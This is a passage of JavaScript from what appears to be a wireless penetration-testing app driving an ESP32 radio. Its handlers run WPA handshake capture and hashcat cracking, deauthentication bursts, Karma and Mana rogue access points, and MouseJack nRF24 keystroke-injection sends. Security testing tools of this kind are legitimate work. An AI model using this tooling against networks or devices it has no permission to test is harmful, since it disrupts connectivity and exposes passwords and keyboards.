  return `<div class="finding low"><div class="ftitle">${Icon('check', { size: 15 })}Bridge reachable</div>
    <div class="fdetail">hashcat ${escapeHtml(bridgeStatus.hashcat || '?')} · mode
      ${escapeHtml(bridgeStatus.mode || '?')} · queued ${bridgeStatus.queued ?? 0} ·
      wordlists: ${escapeHtml(wl)}</div>
    <div class="fdetail" style="font-size:11px;opacity:.6">rules: ${escapeHtml(rl)}</div></div>`;
}

/** Channel analyzer result — horizontal bar chart showing packets per channel. */
function analyzerResultHtml(r) {
  const maxPackets = Math.max(1, ...(r.channels || []).map((c) => c.packets));
  const bars = (r.channels || []).map((c) => {
    const pct = (c.packets / maxPackets) * 100;
    return `<div class="anbarrow">
      <span class="anlabel">ch${c.channel}</span>
      <div class="antrack"><div class="anfill" style="width:${Math.round(pct)}%"></div></div>
      <span class="ancount">${c.packets}</span>
    </div>`;
  }).join('');
  return `<div class="anresult">
    ${r.aborted ? '<div class="finding high"><div class="ftitle">Scan aborted</div></div>' : ''}
    <div class="anbars">${bars}</div>
    <div class="ancaption">${r.dwell_ms}ms per channel · ${r.total} channels</div>
  </div>`;
}

/** The crack attack's controls: extract, then submit what was found. */
function crackActionHtml(a) {
  if (!a.ready) {
    // When blocked, show what still needs to happen. One button per blocker
    // so the user can resolve them right from this card.
    const ctx = attackContext();
    let rows = '';
    if (!ctx.hasCapture) {
      rows += `<div class="crackmeta">${Icon('alert', { size: 14 })}Nothing captured yet. Run Capture on the board, then Analyze it.</div>`;
    }
    if (!ctx.hasHandshake) {
      rows += `<div class="crackmeta">${Icon('alert', { size: 14 })}No handshake extracted.
        After capture, the Analysis stage finds targets — then Force a handshake to catch the key exchange.</div>`;
      if (ctx.hasCapture) {
        rows += `<div class="row" style="margin-top:8px">
          <button id="crackExtract" class="primary">${Icon('key', { size: 18 })}Extract handshakes</button>
        </div>`;
      }
    }
    if (!bridgeStatus?.ok) {
      rows += `<div class="row" style="margin-top:8px"><button id="brTest" class="primary">${Icon('link', { size: 18 })}Test bridge now</button></div>`;
    }
    return rows || '';
  }
  const hs = handshakeResult;
  const cs = crackStrategy();

  if (crackRunning) {
    const p = crackJob || {};
    const pct = typeof p.progress === 'number' ? Math.round(p.progress * 100) : 0;
    return `
      <div class="crackbox">
        <div class="crackstate">searching — ${escapeHtml(p.state || 'running')}</div>
        ${p.step ? `<div class="crackmeta" style="color:var(--accent);font-size:11.5px">${escapeHtml(p.step)}</div>` : ''}
        <div class="pbar"><span style="width:${pct}%"></span></div>
        <div class="crackmeta">${pct}%${p.speed_hs ? ` · ${Math.round(p.speed_hs).toLocaleString()} H/s` : ''}
          · job ${escapeHtml(p.job_id || '')}</div>
      </div>`;
  }

  if (crackJob && crackJob.done) {
    const j = crackJob;
    if (j.state === 'cracked' && j.password) {
      return `
        <div class="crackbox win">
          <div class="crackstate">${Icon('key', { size: 15 })}passphrase recovered</div>
          <div class="pw">${escapeHtml(j.password)}</div>
          <div class="crackmeta">${j.step ? escapeHtml(j.step) + ' · ' : ''}job ${escapeHtml(j.jobId || '')}</div>
        </div>
        <div class="row" style="margin-top:8px">
          <button id="crackRun" class="ghost">${Icon('refresh', { size: 18 })}Search again</button>
        </div>`;
    }
    const why = j.state === 'exhausted'
      ? 'The wordlist ran out without a match. The handshake is good — this passphrase is just not in that list.'
      : j.state === 'timeout'
        ? 'Gave up waiting on the bridge.'
        : `The bridge reported: ${j.error || j.state}`;
    return `
      <div class="crackbox">
        <div class="crackstate">${escapeHtml(j.state)}</div>
        <div class="crackmeta">${j.step ? escapeHtml(j.step) + ' — ' : ''}${escapeHtml(why)}</div>
      </div>
      <div class="row" style="margin-top:8px">
        <button id="crackRun" class="ghost">${Icon('refresh', { size: 18 })}Search again</button>
      </div>`;
  }

  if (!hs) {
    return `
      <div class="row" style="margin-top:8px">
        <button id="crackExtract" class="primary">${Icon('key', { size: 18 })}Extract handshakes</button>
      </div>`;
  }

  if (!hs.handshakes.length) {
    const why = hs.incomplete.length
      ? hs.incomplete.map((i) => `<li>${escapeHtml(i.bssid)} · ${escapeHtml(i.reason)} — ${escapeHtml(i.detail)}</li>`).join('')
      : '<li>No WPA key exchange and no PMKID in this capture.</li>';
    return `
      <div class="crackbox">
        <div class="crackstate">nothing crackable here</div>
        <div class="crackmeta">${hs.counts.eapolFrames} EAPOL frame(s), M1 ${hs.counts.m1} ·
          M2 ${hs.counts.m2} · M3 ${hs.counts.m3} · M4 ${hs.counts.m4}</div>
        <ul class="blockers">${why}</ul>
      </div>
      <div class="row" style="margin-top:8px">
        <button id="crackExtract" class="ghost">${Icon('refresh', { size: 18 })}Re-read capture</button>
      </div>`;
  }

  const rows = hs.handshakes.map((h) => `
    <div class="hsrow">
      <div class="hstype">${escapeHtml(h.type)}</div>
      <div class="hsmain">
        <div class="hsssid">${escapeHtml(h.essid || '(no name)')}</div>
        <div class="hsmeta">${escapeHtml(h.bssid)} ← ${escapeHtml(h.client)} ·
          ${h.messages.map(escapeHtml).join('+')}</div>
      </div>
    </div>`).join('');

  return `
    <div class="crackbox">
      <div class="crackstate">${hs.handshakes.length} crackable
        ${hs.handshakes.length === 1 ? 'handshake' : 'handshakes'}</div>
      <div class="hslist">${rows}</div>
    </div>
    <div class="secsum" style="margin-top:10px">
      <div class="sechead">${Icon('settings', { size: 14 })} Strategy</div>
      <div class="fields" style="margin-bottom:0">
        <div class="field">
          <span>Wordlist</span>
          <select id="crackWl">
            ${(bridgeStatus?.wordlists || ['rockyou.txt']).map((w) =>
              `<option value="${escapeHtml(w)}" ${cs.wordlist === w ? 'selected' : ''}>${escapeHtml(w)}</option>`
            ).join('')}
          </select>
        </div>
        <div class="field">
          <span>Ruleset</span>
          <select id="crackRl">
            <option value="none" ${cs.rules === 'none' ? 'selected' : ''}>none</option>
            ${(bridgeStatus?.rules || ['best64.rule']).map((r) =>
              `<option value="${escapeHtml(r)}" ${cs.rules === r ? 'selected' : ''}>${escapeHtml(r)}</option>`
            ).join('')}
          </select>
        </div>
      </div>
      <div class="fields" style="margin-bottom:0;margin-top:6px">
        <div class="field">
          <span>Mode</span>
          <select id="crackMode">
            <option value="dictionary" ${cs.mode === 'dictionary' ? 'selected' : ''}>Dictionary</option>
            <option value="mask" ${cs.mode === 'mask' ? 'selected' : ''}>Mask</option>
          </select>
        </div>
        <div class="field" id="crackMaskField" style="${cs.mode === 'mask' ? '' : 'display:none'}">
          <span>Mask</span>
          <input id="crackMask" placeholder="${CRACK_DEFAULT_STRATEGY.mask}" value="${escapeHtml(cs.mask === CRACK_DEFAULT_STRATEGY.mask ? '' : cs.mask)}">
        </div>
      </div>
      <label style="display:flex;align-items:center;gap:8px;margin-top:8px;font-size:12.5px;color:var(--muted);cursor:pointer">
        <input type="checkbox" id="crackChain" ${cs.chain ? 'checked' : ''}>
        Chain: if dictionary exhausts, try mask attack next
      </label>
    </div>
    <div class="row" style="margin-top:8px">
      <button id="crackRun" class="primary">${Icon('attack', { size: 18 })}Crack on the bridge</button>
      <button id="crackExtract" class="ghost">${Icon('refresh', { size: 18 })}Re-read</button>
    </div>`;
}

/**
 * The forced-handshake controls.
 *
 * This is the one attack that puts something on the air, so the panel is built
 * around showing what actually happened rather than what was asked for: the
 * firmware clamps the burst and reports the clamped numbers back, and those are
 * the numbers on screen.
 *
 * The chain is deliberately two steps the operator can see — burst, then
 * listen — rather than one opaque action. A deauth that reports success while
 * nothing was captured is the failure mode worth designing against, and you can
 * only tell those apart if the two halves report separately.
 */
function deauthActionHtml(a) {
  if (!a.ready) return '';

  const t = (analysisPlan && selectedTargetIndex != null)
    ? analysisPlan.targets[selectedTargetIndex]
    : (analysisPlan ? topTarget(analysisPlan) : null);
  if (!t) {
    return `<div class="crackbox">
      <div class="crackstate">no target chosen</div>
      <div class="crackmeta">Build the Analysis plan first — the burst needs a BSSID and a
        channel, and the plan is what picks them.</div>
    </div>`;
  }

  const head = `
    <div class="crackmeta">Target <b>${escapeHtml(t.ssid || '(no name)')}</b> ·
      ${escapeHtml(t.bssid)} · channel ${t.channel ?? '?'}</div>`;

  if (txRunning) {
    const r = txResult || {};
    return `<div class="crackbox">
      ${head}
      <div class="crackstate">${Icon('antenna', { size: 15 })}${escapeHtml(r.phase || 'transmitting')}</div>
      <div class="crackmeta">${r.requested ?? 0} frames requested · ${r.count ?? 0} after the
        firmware's clamp · ${r.interval_ms ?? 0} ms apart</div>
      <div class="row" style="margin-top:8px">
        <button id="deauthStop" class="ghost">${Icon('unlink', { size: 18 })}Stop</button>
      </div>
    </div>`;
  }

  if (txResult) {
    const r = txResult;
    const ok = r.sent > 0;
    const clamped = r.requested !== r.count;
    const kaputLine = kaputResult
      ? kaputResult.alive
        ? `<div class="crackmeta">${Icon('signal', { size: 14 })}Kaput Guard: AP alive — deauth working (not kaput) · ${kaputResult.beacons} beacon(s) from target</div>`
        : `<div class="crackmeta" style="color:var(--accent)">${Icon('alert', { size: 14 })}Kaput Guard: AP silent — deauth may have killed it (true kaput) · no beacons from target in ${kaputResult.chunks} frames</div>`
      : '';
    return `<div class="crackbox ${ok ? 'win' : ''}">
      ${head}
      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'nothing went out'}</div>
      <div class="crackmeta">${r.sent} of ${r.count} frames sent · ${r.failed} refused by the driver
        · channel ${r.channel}${clamped ? ` · clamped from ${r.requested}` : ''}</div>
      ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
      ${kaputLine}
      <div class="row" style="margin-top:8px">
        <button id="deauthGo" class="ghost">${Icon('refresh', { size: 18 })}Fire again</button>
      </div>
    </div>`;
  }

  return `<div class="crackbox">
    ${head}
    <div class="crackmeta">Sends a deauth burst at this BSSID, then starts a capture to catch the
      rejoin. This puts frames on the air — only run it against a network you are allowed to test.</div>
    <div class="row" style="margin-top:8px">
      <button id="deauthGo" class="primary">${Icon('capture', { size: 18 })}Fire the burst</button>
    </div>
  </div>`;
}


/** Karma (Probe Reply) controls. Channels the probe-response template through
 *  the bridge. The app builds the full frame once; the firmware hot-swaps the
 *  SSID before transmitting. */
function karmaActionHtml(a) {
  if (!a.ready) return '';

  const dev = state.deviceInfo;
  const defaultBssid = dev?.bssid || 'aa:bb:cc:dd:ee:ff';
  const bssidSaved = localStorage.getItem('attackBssid') || defaultBssid;
  const allowlistSaved = localStorage.getItem('karmaAllowlist') || '';
  const channelSaved = localStorage.getItem('karmaChannel') || '6';
  const modeSaved = localStorage.getItem('karmaMode') || 'allowlist';

  if (karmaRunning) {
    const r = karmaResult || {};
    return `<div class="crackbox">
      <div class="crackstate">${Icon('antenna', { size: 15 })}Karma running</div>
      <div class="crackmeta">channel ${r.channel || '?'} · mode ${escapeHtml(String(r.mode || '?'))}
        · matched ${r.matched ?? 0} · sent ${r.sent ?? 0}${r.failed ? ' · failed ' + r.failed : ''}</div>
      <div class="row" style="margin-top:8px">
        <button id="karmaStop" class="ghost">${Icon('unlink', { size: 18 })}Stop</button>
        <button id="karmaRefresh" class="ghost" style="margin-left:0">${Icon('refresh', { size: 15 })}</button>
      </div>
    </div>`;
  }

  if (karmaResult) {
    const r = karmaResult;
    const ok = r.sent > 0;
    return `<div class="crackbox ${ok ? 'win' : ''}">
      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'Karma complete' : Icon('alert', { size: 15 }) + 'no probes answered'}</div>
      <div class="crackmeta">${r.matched} probes matched · ${r.sent} sent · ${r.failed} failed
        · channel ${r.channel} · ${r.elapsed_ms}ms</div>
      ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
      <div class="row" style="margin-top:8px">
        <button id="karmaGo" class="ghost">${Icon('refresh', { size: 18 })}Run again</button>
      </div>
    </div>`;
  }

  const karmaPresetName = localStorage.getItem('karmaPreset') || '';

  return `<div class="crackbox">
    <div class="crackmeta">Answers probe requests on the named channel. The firmware swaps the
      requested SSID into a pre-built template — the radio never builds a frame, only the phone
      does. Every probe request that matches gets a response.</div>
    ${presetControlsHtml('karma', karmaPresetName)}
    <div class="fields">
      <label class="field">
        <span>Channel</span>
        <input id="karmaCh" type="number" value="${escapeHtml(channelSaved)}" min="1" max="14" style="width:3rem">
      </label>
      <label class="field">
        <span>Mode</span>
        <select id="karmaModeSel">
          <option value="allowlist" ${modeSaved === 'allowlist' ? 'selected' : ''}>Answer only listed names</option>
          <option value="lab-any" ${modeSaved === 'lab-any' ? 'selected' : ''}>lab-any (answer everything)</option>
        </select>
      </label>
    </div>
    <label class="field">
      <span>SSIDs to answer (one per line)</span>
      <textarea id="karmaList" rows="4" autocapitalize="off" spellcheck="false"
        placeholder="NETGEAR&#10;xfinitywifi&#10;attwifi">${escapeHtml(allowlistSaved)}</textarea>
    </label>
    <div class="row" style="margin-top:4px">
      <button id="karmaDefaults" class="ghost" style="font-size:12px">${Icon('list', { size: 14 })}Defaults</button>
    </div>
    <label class="field" style="margin-top:6px">
      <span>BSSID (transmitter MAC)</span>
      <div class="row" style="gap:4px">
        <input id="karmaBssid" type="text" pattern="^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$"
               value="${escapeHtml(bssidSaved)}" style="flex:1;font-family:monospace;font-size:12px">
        <button id="karmaBssidRandom" class="ghost" style="font-size:11px;white-space:nowrap">Random</button>
      </div>
    </label>
    <div class="crackmeta">template ~400 bytes · hard cap 120 s</div>
    <div class="row" style="margin-top:8px">
      <button id="karmaGo" class="primary">${Icon('capture', { size: 18 })}Start Karma</button>
    </div>
  </div>`;
}

/** Mana (Beacon Pool) controls. The app builds one beacon per SSID; the
 *  firmware rotates through them from loop(). Broadcast, not unicast, so an
 *  independent receiver sees every one. */
function manaActionHtml(a) {
  if (!a.ready) return '';

  const dev = state.deviceInfo;
  const defaultBssid = dev?.bssid || 'aa:bb:cc:dd:ee:ff';
  const bssidSaved = localStorage.getItem('attackBssid') || defaultBssid;
  const ssidsSaved = localStorage.getItem('manaSSIDs') || '';
  const channelSaved = localStorage.getItem('manaChannel') || '6';
  const intervalSaved = localStorage.getItem('manaInterval') || '110';

  if (manaRunning) {
    const r = manaResult || {};
    return `<div class="crackbox">
      <div class="crackstate">${Icon('antenna', { size: 15 })}Mana running</div>
      <div class="crackmeta">pool ${r.pool_size ?? '?'} · sent ${r.sent ?? 0}
        ${r.failed ? ' · failed ' + r.failed : ''} · channel ${r.channel || '?'}</div>
      <div class="row" style="margin-top:8px">
        <button id="manaStop" class="ghost">${Icon('unlink', { size: 18 })}Stop</button>
        <button id="manaRefresh" class="ghost" style="margin-left:0">${Icon('refresh', { size: 15 })}</button>
      </div>
    </div>`;
  }

  if (manaResult) {
    const r = manaResult;
    const ok = r.sent > 0;
    return `<div class="crackbox ${ok ? 'win' : ''}">
      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'Mana complete' : Icon('alert', { size: 15 }) + 'nothing sent'}</div>
      <div class="crackmeta">${r.sent} beacons sent · ${r.failed} failed
        · pool ${r.pool_size} · channel ${r.channel} · ${r.elapsed_ms}ms</div>
      ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
      <div class="row" style="margin-top:8px">
        <button id="manaGo" class="ghost">${Icon('refresh', { size: 18 })}Run again</button>
      </div>
    </div>`;
  }

  const manaPresetName = localStorage.getItem('manaPreset') || '';

  return `<div class="crackbox">
    <div class="crackmeta">Rotates a pool of pre-built beacons on the named channel. Each beacon
      claims a different SSID — the firmware rotates through them so nearby devices see every
      name. The SSID is in clear text; the WPA2 RSN IE is pre-built.</div>
    ${presetControlsHtml('mana', manaPresetName)}
    <div class="fields">
      <label class="field">
        <span>Channel</span>
        <input id="manaCh" type="number" value="${escapeHtml(channelSaved)}" min="1" max="14" style="width:3rem">
      </label>
      <label class="field">
        <span>Interval (ms per beacon)</span>
        <input id="manaIntv" type="number" value="${escapeHtml(intervalSaved)}" min="50" max="5000" style="width:4rem">
      </label>
    </div>
    <label class="field">
      <span>SSIDs (one per line)</span>
      <textarea id="manaList" rows="4" autocapitalize="off" spellcheck="false"
        placeholder="NETGEAR&#10;xfinitywifi&#10;attwifi">${escapeHtml(ssidsSaved)}</textarea>
    </label>
    <div class="row" style="margin-top:4px">
      <button id="manaDefaults" class="ghost" style="font-size:12px">${Icon('list', { size: 14 })}Defaults</button>
      ${analysisPlan ? `<button id="manaPopulate" class="ghost" style="font-size:12px;margin-left:6px">${Icon('capture', { size: 14 })}Populate from Analysis</button>
      <span id="manaPopulateCount" style="font-size:11px;opacity:.6;margin-left:6px"></span>` : ''}
    </div>
    <label class="field" style="margin-top:6px">
      <span>BSSID (transmitter MAC)</span>
      <div class="row" style="gap:4px">
        <input id="manaBssid" type="text" pattern="^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$"
               value="${escapeHtml(bssidSaved)}" style="flex:1;font-family:monospace;font-size:12px">
        <button id="manaBssidRandom" class="ghost" style="font-size:11px;white-space:nowrap">Random</button>
      </div>
    </label>
    <div class="crackmeta">~400 bytes per beacon · hard cap 64 SSIDs · 120 s</div>
    <div class="row" style="margin-top:8px">
      <button id="manaGo" class="primary">${Icon('capture', { size: 18 })}Start Mana</button>
    </div>
  </div>`;
}

/** MouseJack (nRF24) controls. No WiFi transmit path needed — this is a separate SPI radio. */
function mousejackActionHtml(a) {
  if (!a.ready) return '';
  const addrSaved = localStorage.getItem('mousejackAddr') || '';
  const chSaved = localStorage.getItem('mousejackCh') || '5';
  const countSaved = localStorage.getItem('mousejackCount') || '3';
  const mjResult = state.mjResult || null;

  if (state.mjSending) {
    return `<div class="crackbox">
      <div class="crackstate">${Icon('antenna', { size: 15 })}transmitting…</div>
      <div class="crackmeta">${state.mjSent || 0} packets sent · channel ${state.mjChannel || '?'}</div>
    </div>`;
  }

  if (mjResult) {
    const ok = mjResult.sent;
    return `<div class="crackbox ${ok ? 'win' : ''}">
      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'failed'}</div>
      <div class="crackmeta">${mjResult.sent ? mjResult.count + ' packets' : '0 packets'} · channel ${mjResult.channel}
        ${mjResult.fifo_st != null ? ' · fifo_st: 0x' + mjResult.fifo_st.toString(16) : ''}</div>
      <div class="row" style="margin-top:8px">
        <button id="mjGo" class="ghost">${Icon('refresh', { size: 18 })}Send again</button>
      </div>
    </div>`;
  }

  const payloadOptions = MOUSEJACK_PAYLOADS.map((p) =>
    `<option value="${p.id}"${p.hex ? '' : ' selected'}>${escapeHtml(p.name)}</option>`
  ).join('');

  // Grouped by what you are doing, not by what type the input is: aim, then
  // payload, then fire. The long tail (raw hex, burst size, clear) folds away —
  // the everyday path is one address, one payload, one button.
  return `<div class="crackbox">
    <div class="crackmeta">Raw nRF24 packets at a Logitech Unifying (or any nRF24) receiver. That is a
      separate 2.4 GHz radio — none of this goes through the ESP32's WiFi.</div>

    <div class="sechead">Aim</div>
    <div class="fields aim">
      <label class="field">
        <span>Receiver address</span>
        <input id="mjAddr" type="text" autocapitalize="off" spellcheck="false"
               placeholder="e7e7e7e7e7" value="${escapeHtml(addrSaved)}"
               style="font-family:monospace;font-size:12px">
      </label>
      <label class="field">
        <span>Channel</span>
        <input id="mjCh" type="number" value="${escapeHtml(chSaved)}" min="0" max="125" style="width:3rem">
      </label>
    </div>

    <div class="sechead">Payload</div>
    <label class="field">
      <span>Canned</span>
      <select id="mjPayload">${payloadOptions}</select>
    </label>
    <div class="crackmeta" id="mjInfo">Pick a canned payload, or set your own hex under Advanced.</div>

    <div class="row" style="margin-top:8px">
      <button id="mjGo" class="primary">${Icon('antenna', { size: 18 })}Send</button>
    </div>

    <details id="mjAdvanced">
      <summary>Advanced</summary>
      <label class="field">
        <span>Hex payload (max 32 bytes)</span>
        <textarea id="mjHex" rows="2" autocapitalize="off" spellcheck="false"
          placeholder="e7e7e7e7e700010203" style="font-family:monospace;font-size:12px"></textarea>
      </label>
      <label class="field">
        <span>Packets per send</span>
        <input id="mjCount" type="number" value="${escapeHtml(countSaved)}" min="1" max="20" style="width:3rem">
      </label>
      <div class="row">
        <button id="mjClear" class="ghost" style="font-size:12px">${Icon('unlink', { size: 14 })}Clear</button>
      </div>
    </details>
  </div>`;
}

/** Turn a frame's bytes into the hex TX_FRAME expects. */
function frameHex(u8) {
  return Array.from(u8).map((b) => b.toString(16).padStart(2, '0')).join('');
}

function onPickTarget(e) {
  const idx = parseInt(e.currentTarget.dataset.idx, 10);
  if (!isNaN(idx)) {
    selectedTargetIndex = idx;
    // Take the operator to the Attacks PAGE. Attack is its own tab since the
    // split, so `state.stage = 'attack'` is dead: the Capture panel can only be
    // the packets view now, and a pick that only set the old stage repainted
    // Capture and left the operator with no way to reach "Fire the burst".
    setPage('attacks');
    // Land on the card the pick was for, not the top of a collapsed list.
    openAttackId = 'handshake';
    refreshPanels();
  }
}

async function onDeauthCapture() {
  // Use the operator's picked target, not always the top-scored one.
  const t = (analysisPlan && selectedTargetIndex != null)
    ? analysisPlan.targets[selectedTargetIndex]
    : (analysisPlan ? topTarget(analysisPlan) : null);
  if (!t?.bssid) { log('err', 'deauth: no target — build the plan first'); return; }
  if (t.channel == null) { log('err', 'deauth: target has no channel'); return; }

  // The burst shape. These are what the app ASKS for; the firmware clamps them
  // and its reply is what gets stored, so the panel can never claim more than
  // the radio did.
  const count = 150;
  const intervalMs = 30;

  txRunning = true;
  txResult = { phase: 'transmitting', requested: count, count, interval_ms: intervalMs, channel: t.channel };
  refreshPanels();

  let frame;
  try {
    frame = buildDeauth({ bssid: t.bssid, reason: 7, seq: 1 });
  } catch (e) {
    txRunning = false; txResult = null;
    log('err', 'deauth: could not build the frame — ' + e.message);
    refreshPanels();
    return;
  }

  try {
    const resp = await request('TX_FRAME', {
      hex: frameHex(frame), channel: t.channel, count, interval_ms: intervalMs,
    }, { timeoutMs: 10000 });
    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused the burst');

    // Store the firmware's numbers, not ours — this is the whole point.
    txResult = {
      ...txResult,
      requested: resp.requested ?? count,
      count: resp.count ?? count,
      interval_ms: resp.interval_ms ?? intervalMs,
      channel: resp.channel ?? t.channel,
      frame_len: resp.frame_len,
      phase: 'transmitting',
    };
    log('ev', `deauth: burst started — ${resp.count} frames on ch${resp.channel}, ${resp.interval_ms} ms apart`);
    refreshPanels();

    // Wait out the burst, then listen for the rejoin. The firmware paces it, so
    // the app's wait is just the burst's own duration plus a margin.
    await new Promise((r) => setTimeout(r, (resp.count ?? count) * (resp.interval_ms ?? intervalMs) + 700));

    const st = await request('TX_STATUS', {}, { timeoutMs: 5000 });
    txResult = { ...txResult, sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'done' };
    log('ev', `deauth: ${st?.sent ?? 0} frames sent, ${st?.failed ?? 0} refused`);
    if (!st?.sent && st?.failed) {
      log('err', 'deauth: driver refused every frame — radio mode or channel may be stale ' +
        '(try stopping Karma/Mana first, or check the target channel is 1–14)');
    }

    // Now the second half: listen for the handshake the burst was meant to provoke.
    txRunning = false;
    refreshPanels();
    await onStartCaptureAfterBurst(t.channel);
  } catch (e) {
    txResult = { ...txResult, sent: 0, failed: 0, phase: 'failed', note: e.message };
    log('err', 'deauth: ' + e.message);
  }
  txRunning = false;
  refreshPanels();
}

/** True from the moment a burst's listening capture starts until its capture_done
 *  lands. This is the flag state.stage used to carry for this one purpose; it was
 *  dead the whole time Attack was its own tab, so nothing ever collected the
 *  post-burst capture. Owned entirely by the burst flow: armed in
 *  onStartCaptureAfterBurst, cleared here. */
let awaitingBurstCapture = false;

/** Auto-sync and extract after the burst capture finishes. */
let autoExtractRun = 0;
async function syncAfterBurst() {
  autoExtractRun++;
  const runId = autoExtractRun;
  // Small delay to let the board settle after announcing capture_done
  await new Promise((r) => setTimeout(r, 500));
  if (runId !== autoExtractRun) return; // another one came in
  try {
    await capture.sync();
    const s = capture.summary();
    log('ev', `post-burst: synced ${s.packets} packets`);
  } catch (e) {
    log('err', 'post-burst sync: ' + e.message);
    return;
  }
  if (runId !== autoExtractRun) return;
  const w = capture.writer;
  if (!w?.chunks?.length) return;
  try {
    handshakeResult = extractHandshakes(w.chunks);
    crackJob = null;
    const c = handshakeResult.counts;
    log('ev', `post-burst: ${handshakeResult.handshakes.length} handshake(s) from ${w.chunks.length} frames`);
  } catch (e) {
    log('err', 'post-burst extract: ' + e.message);
  }
  // Kaput Guard: check if the target AP is still beaconing
  if (selectedTargetIndex != null && analysisPlan?.targets[selectedTargetIndex]) {
    const target = analysisPlan.targets[selectedTargetIndex];
    try {
      kaputResult = kaputCheck(w.chunks, target.bssid);
      log('ev', `kaput: target ${target.bssid} ${kaputResult.alive ? 'alive' : 'silent'} (${kaputResult.beacons} beacons)`);
    } catch (e) {
      log('err', 'kaput: ' + e.message);
    }
  }
  // Check bridge status if not done recently
  if (!bridgeStatus?.ok && !bridgeError) {
    try {
      bridgeStatus = await bridgeClient().health();
      log('ev', `bridge: ${bridgeStatus.hashcat} ready`);
    } catch { /* fine */ }
  }
  refreshPanels();
}

/** Start a capture on the target's channel — the listening half of the chain. */
async function onStartCaptureAfterBurst(channel) {
  if (capture.running) { log('ev', 'deauth: capture already running, leaving it alone'); return; }
  try {
    await capture.start({ channel, durationMs: 20000 });
    // Arm the flag BEFORE the log, the repaint and the ticker. capture_done can
    // land the instant the board accepts the capture's 20 s, so a flag set one
    // microtask later would miss its own completion and reintroduce the bug.
    awaitingBurstCapture = true;
    log('ev', `capture: listening on ch${channel} for the rejoin — 20 s`);
    refreshPanels();
    startCapTicker();
  } catch (e) {
    awaitingBurstCapture = false;
    log('err', 'capture after burst: ' + e.message);
  }
}

async function onDeauthStop() {
  try {
    const st = await request('TX_STOP', {}, { timeoutMs: 5000 });
    txResult = { ...(txResult || {}), sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'stopped' };
    log('ev', `deauth: stopped after ${st?.sent ?? 0} frames`);
  } catch (e) {
    log('err', 'deauth stop: ' + e.message);
  }
  txRunning = false;
  refreshPanels();
}

/** MouseJack: send nRF24 packets at a receiver. */
async function onMousejackSend() {
  const hex = $('#mjHex')?.value?.trim();
  const addr = $('#mjAddr')?.value?.trim();
  const ch = parseInt($('#mjCh')?.value || '2', 10);
  const count = parseInt($('#mjCount')?.value || '1', 10);

  if (!hex) { log('err', 'mousejack: no hex payload'); return; }
  const cleaned = hex.replace(/\s+/g, '');
  if (cleaned.length > 64) { log('err', 'mousejack: payload too long (max 64 hex chars = 32 bytes)'); return; }
  if (cleaned.length % 2) { log('err', 'mousejack: hex must have even length'); return; }

  state.mjSending = true;
  state.mjSent = 0;
  state.mjChannel = ch;
  state.mjResult = null;
  refreshPanels();

  for (let i = 0; i < count; i++) {
    try {
      const args = { hex: cleaned, channel: ch };
      if (addr) args.addr = addr;
      const resp = await request('NRF_SEND', args, { timeoutMs: 5000 });
      if (!resp?.ok) {
        log('err', `mousejack #${i + 1}: firmware refused (${resp?.error || 'no error'})`);
        break;
      }
      state.mjSent++;
      state.mjResult = { sent: true, count: state.mjSent, channel: ch, fifo_st: resp.fifo_st };
      log('ev', `mousejack #${i + 1}: sent on ch${ch} (fifo_st: 0x${(resp.fifo_st ?? 0).toString(16)})`);
    } catch (e) {
      log('err', `mousejack #${i + 1}: ${e.message}`);
      break;
    }
  }

  state.mjSending = false;
  if (!state.mjResult) {
    state.mjResult = { sent: false, count: 0, channel: ch };
  }
  refreshPanels();
}

async function onBridgeTest() {
  bridgeError = null; bridgeStatus = null;
  renderSettingsPanel(); refreshPanels();
  try {
    bridgeStatus = await bridgeClient().health();
    log('ev', `bridge: hashcat ${bridgeStatus.hashcat}, ${(bridgeStatus.wordlists || []).length} wordlist(s)`);
  } catch (e) {
    bridgeError = e.message;
    log('err', 'bridge: ' + e.message);
  }
  renderSettingsPanel(); refreshPanels();
}

function onExtractHandshakes() {
  // Two sources, and they are not interchangeable: a live capture hands over the
  // chunks as they were written, an imported file hands over the frames the importer
  // parsed. This used to read the live writer only, so with an imported capture on
  // screen the button was live, tapped, and did nothing whatsoever — no log line, no
  // repaint, no clue as to why. Read whichever is actually there, and name it in the
  // log, so "nothing happened" can never be the whole story again.
  const live = capture?.writer?.chunks?.length ? capture.writer.chunks : null;
  const imported = importedCapture?.chunks?.length ? importedCapture.chunks : null;
  const chunks = live || imported;
  if (!chunks) {
    log('err', 'extract: nothing to read — capture a handshake, or import a capture file first');
    return;
  }
  const from = live ? 'the live capture' : `the imported file (${importedCapture.name})`;
  const t0 = Date.now();
  try {
    handshakeResult = extractHandshakes(chunks);
  } catch (e) {
    log('err', 'extract: ' + e.message);
    return;
  }
  crackJob = null;
  const c = handshakeResult.counts;
  const n = handshakeResult.handshakes.length;
  const rate = `in ${Date.now() - t0} ms (EAPOL ${c.eapolFrames}, M1 ${c.m1}, ` +
    `M2 ${c.m2}, M3 ${c.m3}, M4 ${c.m4})`;
  if (n) log('ev', `handshakes: ${n} crackable from ${chunks.length} frames ${rate}`);
  else log('ev', `handshakes: none crackable in ${from} — ${chunks.length} frames, ${rate}`);
  if (handshakeResult.incomplete.length) {
    log('ev', `${handshakeResult.incomplete.length} key exchange(s) were incomplete — a ` +
      'handshake needs all four EAPOL messages, or a PMKID on its own');
  }
  refreshPanels();
}

// ── import a capture from outside the app ────────────────────────────────────
//
// The portal runs in another app; this is where what it produces lands. A handshake
// arrives as a file, and from here on it is indistinguishable from a captured one —
// same handshakeResult, same crack stage, same bridge.

/** A file chosen from the picker. Reads it, then hands the bytes to the one importer. */
async function onImportPick(file) {
  if (!file) return;
  const btn = $('#importBtn');
  if (btn) btn.disabled = true;
  try {
    const bytes = new Uint8Array(await file.arrayBuffer());
    await onImportPickBytes(bytes, file.name);
  } catch (e) {
    importedCapture = null;
